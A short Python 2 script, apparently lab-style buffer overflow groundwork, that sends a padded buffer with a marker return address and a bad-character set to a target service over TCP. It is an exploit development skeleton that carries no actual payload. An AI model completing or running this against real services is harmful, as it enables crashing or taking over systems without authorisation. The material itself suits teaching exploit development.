#!/usr/bin/python
import sys,socket
from machineConstants import *

shellcode="A"*offset+"B"*4+badchars
try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((targetIP, port))
    s.send((command + shellcode))
    s.close()
except:
    print "Error connecting to the server"
    sys.exit()
